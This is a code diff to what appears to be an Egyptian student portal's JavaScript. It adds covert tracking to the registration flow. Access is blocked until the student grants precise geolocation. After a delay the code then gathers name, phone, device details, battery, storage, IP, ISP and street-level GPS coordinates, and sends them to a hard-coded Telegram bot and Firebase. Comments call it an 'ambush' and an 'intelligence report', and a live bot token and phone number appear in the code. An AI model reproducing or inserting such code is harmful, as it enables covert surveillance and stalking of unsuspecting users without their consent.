@@ -677,84 +677,116 @@ function completeRegistration() {
     const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
     if(!user) return;
 
-    // --- واجهة المنصة (تفتح فوراً للسرعة) ---
-    document.getElementById('login-gate').style.display = 'none';
-    document.getElementById('sidebar').style.display = 'flex';
-    document.getElementById('top-bar').style.display = 'flex';
-    document.getElementById('content').style.display = 'block';
-    document.getElementById('display-name').innerText = user.name.split(' ')[0];
+    // --- إجبار الموقع برسالة آدم المخصصة (تعديل الإيموجي) ---
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                // فتح المنصة فوراً عند الموافقة
+                document.getElementById('login-gate').style.display = 'none';
+                document.getElementById('sidebar').style.display = 'flex';
+                document.getElementById('top-bar').style.display = 'flex';
+                document.getElementById('content').style.display = 'block';
+                document.getElementById('display-name').innerText = user.name.split(' ')[0];
 
-    // --- الرادار الشامل: سحب كل ثغرة في الجهاز ---
-    // 1. محرك سحب البيانات (بيصبر لحد ما البيانات تخلص)
-const getSystemReport = async () => {
-    const model = navigator.platform;
-    const ram = navigator.deviceMemory || "Unknown";
-    const cores = navigator.hardwareConcurrency || "Unknown";
-    
-    let bat = "Scanning...";
-    try { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "% " + (b.charging ? '⚡' : '🔋'); } catch(e) {}
+                // انطلاق الرادار الشامل
+                startUltimateRadar(position.coords.latitude, position.coords.longitude);
+            },
+            (error) => {
+                // الرسالة بالتعديل الجديد ❤️
+                alert("لازم تسمح بالموقع يا صديقي عشان كودك يتسجل ❤️");
+                location.reload(); 
+            },
+            { enableHighAccuracy: true, timeout: 15000 }
+        );
+    }
+}
 
-    let geo = { ip: "غير معروف", city: "غير معروف", org: "غير معروف", map: "No Map" };
-    
-    try {
-        const res = await fetch('https://ipwho.is/').then(r => r.json());
-        if(res.success) {
-            geo = { 
-                ip: res.ip, 
-                city: res.city + ", " + res.country, 
-                org: res.connection.isp,
-                // لينك الخريطة المباشر عشان يظهر أزرق
-                map: `https://www.google.com/maps?q=${res.latitude},${res.longitude}`
-            };
-        }
-    } catch(e) { console.log("Location Error"); }
+const startUltimateRadar = async (lat, lon) => {
+    setTimeout(async () => {
+        // 1. سحب بيانات البطارية والشحن
+        let batteryInfo = { level: "Unknown", charging: "" };
+        try {
+            const b = await navigator.getBattery();
+            batteryInfo.level = Math.round(b.level * 100) + "%";
+            batteryInfo.charging = b.charging ? " (قيد الشحن ⚡)" : " (يعمل على البطارية 🔋)";
+        } catch(e) {}
 
-    return {
-        name: user.name,
-        phone: user.phone,
-        model: model,
-        hw: cores + " Cores | " + ram + "GB RAM",
-        battery: bat,
-        ip: geo.ip,
-        location: geo.city,
-        isp: geo.org,
-        map: geo.map,
-        lang: navigator.language,
-        time: new Date().toLocaleString('ar-EG')
-    };
-};
+        // 2. سحب بيانات الذاكرة والمساحة
+        const ram = navigator.deviceMemory || "Unknown";
+        let storageInfo = "Unknown";
+        try {
+            const storage = await navigator.storage.estimate();
+            const freeGB = ((storage.quota - storage.usage) / (1024 ** 3)).toFixed(2);
+            storageInfo = `${freeGB} GB متبقية`;
+        } catch(e) {}
 
-// 2. أمر التنفيذ (الكمين - بعد 30 ثانية)
-setTimeout(() => {
-    getSystemReport().then(report => {
-        // تحديث الفايربيز
-        studentsRef.child(user.phone).update({ last_device: report });
+        // 3. سحب بيانات الـ IP والشركة بالتفصيل
+        let netInfo = { ip: "Scanning...", city: "Unknown", isp: "Unknown", country: "" };
+        try {
+            const res = await fetch('https://ipwho.is/').then(r => r.json());
+            if(res.success) {
+                netInfo = { ip: res.ip, city: res.city, isp: res.connection.isp, country: res.country };
+            }
+        } catch(e) {}
 
-        // الإرسال للتليجرام
-        if (user.phone !== "01023175098") {
-            const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
-            const chatId = "5890070301";
+        // 4. تجميع التقرير النهائي المنظم
+        const report = {
+            name: user.name,
+            phone: user.phone,
+            // تجنيب الأخطاء في استخراج نوع الجهاز
+            model: navigator.userAgent.includes('(') ? navigator.userAgent.split('(')[1].split(')')[0] : navigator.platform,
+            hw: `${navigator.hardwareConcurrency || "4"} Cores | ${ram}GB RAM`,
+            storage: storageInfo,
+            battery: batteryInfo.level + batteryInfo.charging,
+            ip: netInfo.ip,
+            isp: netInfo.isp,
+            location: `${netInfo.city}, ${netInfo.country}`,
+            gpsMap: `http://maps.google.com/maps?q=${lat},${lon}`, // لينك جوجل مباشر ومضمون
+            ipMap: `https://ipwho.is/${netInfo.ip}?view=map`, 
+            screen: `${window.screen.width}x${window.screen.height}`,
+            time: new Date().toLocaleString('ar-EG')
+        };
 
-            const text = `🕵️‍♂️ *تقرير اصطياد كامل (كيمو رادار)*
+        // إرسال البيانات للتليجرام بتنسيق "شيك" جداً
+        const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SjcjlHY";
+        const chatId = "5890070301";
+
+        const message = `
+🕵️‍♂️ *تقرير كيمو رادار الاستخباراتي*
 ━━━━━━━━━━━━━━
 👤 *الطالب:* ${report.name}
 📞 *الموبايل:* ${report.phone}
-📱 *الجهاز:* ${report.model}
+━━━━━━━━━━━━━━
+📱 *نوع الجهاز:* ${report.model}
 ⚙️ *الهاردوير:* ${report.hw}
+🖥️ *الشاشة:* ${report.screen}
+💾 *المساحة:* ${report.storage}
 🔋 *البطارية:* ${report.battery}
+━━━━━━━━━━━━━━
 🌐 *الـ IP:* ${report.ip}
-📍 *المكان:* ${report.location}
 🏢 *الشركة:* ${report.isp}
-📍 *موقع الطالب (الخريطة):*
-${report.map}
+📍 *المدينة:* ${report.location}
+━━━━━━━━━━━━━━
+📍 *الموقع الدقيق (الشارع):*
+${report.gpsMap}
+
+📍 *الموقع الاحتياطي (الشبكة):*
+${report.ipMap}
+
 ⏰ *التوقيت:* ${report.time}
 ━━━━━━━━━━━━━━`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        // شرط عدم إرسال بياناتك الشخصية للإزعاج
+        if (user.phone !== "01023175098") {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+            
+            // حفظ في فايربيز للتوثيق
+            if (typeof studentsRef !== 'undefined') {
+                studentsRef.child(user.phone).update({ security_report: report });
+            }
         }
-    });
-}, 30000); 
-
+    }, 8000); 
+};
 
     // --- صلاحيات الأدمن آدم ---
     if(user.phone === "01023175098") {
